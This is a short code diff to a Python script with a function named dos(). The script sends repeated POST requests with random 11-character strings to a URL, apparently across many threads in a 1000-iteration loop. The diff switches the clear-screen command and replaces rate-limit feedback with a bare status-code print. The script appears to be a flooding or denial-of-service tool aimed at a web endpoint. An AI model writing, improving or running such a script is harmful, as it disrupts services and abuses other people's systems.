@@ -4,7 +4,7 @@ import os
 from threading import Thread
 import requests
 
-os.system('cls')
+os.system('clear')
 
 def generator(size=11, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
@@ -24,10 +24,7 @@ def dos():
             r = requests.post(url, json=json)
         except Exception:
             continue
-        if r.status_code == 201:
-            print('posted!')
-        else:
-            print('Next post in: ' + str(r.json()['data']['remaining']['secs'])+ '\n' + generated)
+        print(str(r.status_code) + '\n' + generated)
         print()
 
 for i in range(1000):
